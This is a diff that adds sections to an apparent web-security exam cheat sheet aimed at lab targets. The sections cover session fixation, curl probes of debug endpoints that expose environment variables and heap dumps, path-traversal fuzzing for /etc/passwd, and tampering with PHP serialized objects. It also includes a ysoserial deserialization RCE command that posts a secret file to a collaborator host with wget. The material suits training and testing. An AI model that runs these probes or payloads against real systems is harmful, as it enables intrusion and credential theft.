@@ -1706,6 +1706,48 @@ username=administrator%26field=reset_token%23
 # Create reset for carlos → use macro to auto-brute force MFA/email token
 ```
 
+**Session Fixation**
+```bash
+# Attack: force victim to use a session ID the attacker already knows
+# 1. Attacker obtains session cookie from target.com (e.g., from URL param ?session=ABC)
+# 2. Victim clicks link: https://target.com/login?session=ABC
+# 3. Victim logs in → server authenticates session ABC → attacker now has valid session!
+# 4. Attacker uses session ABC → logged in as victim
+
+# Common fixation vectors:
+# URL parameter: ?session=ABC, ?PHPSESSID=ABC, ?JSESSIONID=ABC
+# Cookie injection via CRLF or subdomain
+# <meta> tag with Set-Cookie
+
+# Detection: login → check if session ID CHANGES after authentication
+# If same session before/after login → fixable!
+```
+
+**Debug Endpoint & Framework Exposure**
+```bash
+# Spring Boot Actuators — full system info exposed
+curl -s https://target.com/actuator/mappings   # All API routes
+curl -s https://target.com/actuator/env        # Environment variables (passwords!)
+curl -s https://target.com/actuator/heapdump   # Memory dump (extract credentials)
+curl -s https://target.com/actuator/loggers    # Logger configs
+
+# Laravel debug mode
+# APP_DEBUG=true → stack traces with DB credentials in errors
+curl -s https://target.com/randomnonexistent
+
+# Django debug
+# DEBUG=True → detailed error pages with settings, DB config
+curl -s https://target.com/template_that_errors
+
+# WordPress
+curl -s https://target.com/wp-json/wp/v2/users   # User enumeration
+curl -s https://target.com/xmlrpc.php             # XML-RPC bruteforce
+
+# Others to scan:
+# /.env, /.env.local, /debug, /trace, /phpinfo.php, /server-status
+# /admin, /manager/html (Tomcat), /jenkins, /phpmyadmin, /grafana
+```
+
 ---
 
 ### **4.6 Cross-Site Request Forgery (CSRF)**
@@ -2049,6 +2091,20 @@ C:\xampp\apache\conf\httpd.conf
 /../../../../../windows/win.ini
 ```
 
+**Burp Intruder — Payload Processing for File Fuzzing**
+```bash
+# Use Burp Intruder to fuzz for different files with one wordlist
+# Pistachio/Payload processing:
+# Payload: etc/passwd
+# → Add rule: Match & replace → \{file\} → etc/passwd
+# Position: ../../../../../\{file\}
+
+# Exam use case:
+# Payload 1: etc/passwd (for POC)
+# Payload 2: home/carlos/secret (for actual flag)
+# Burp handles the replacement automatically across all payload positions
+```
+
 ---
 
 ### **4.10 File Upload Vulnerabilities**
@@ -2191,6 +2247,39 @@ print(base64.b64encode(pickle.dumps(RCE())).decode())
 
 # === Ruby (Marshal) ===
 # Use https://github.com/dreadlocked/marshalsec or universal_rce.rb
+```
+
+**Simple Manipulation — No Gadget Chain Needed**
+```bash
+# Boolean flip — change b:0 to b:1 for admin/superuser flags
+# PHP: O:4:"User":2:{s:8:"username";s:5:"admin";s:9:"isAdmin";b:0;}
+# → change b:0 to b:1 → becomes admin!
+
+# String to boolean conversion — replace access token with boolean true
+# Original: s:13:"administrator";s:12:"access_token";s:32:"abc123...";
+# Exploit:   s:13:"administrator";s:12:"access_token";b:1;
+# b:1 (boolean true) may bypass token validation entirely
+
+# Change length values to inject/remove data
+# s:5:"admin" → change to s:13:"administrator"  (also update length: s:13)
+```
+
+**PHP Backup File Discovery**
+```bash
+# PHP class files often have backup versions exposed on the server
+# Check: /libs/CustomTemplate.php →
+curl -sI https://target.com/libs/CustomTemplate.php   # Source code exposed!
+curl -sI https://target.com/libs/CustomTemplate.php~  # Vim backup!
+# Also try: .bak, .swp, .swo, .orig, .save, .old
+```
+
+**Data Exfiltration via Deserialization RCE**
+```bash
+# Java (ysoserial) — exfiltrate /home/carlos/secret
+java -jar ysoserial-all.jar CommonsCollections4 'wget --post-file /home/carlos/secret http://COLLAB/' | base64 -w 0
+
+# Alternative to ysoserial: RcEcHaIn (handles Java version issues better)
+git clone https://github.com/B3XAL/rCeChAiN
 ```
 
 **Common Injection Points**
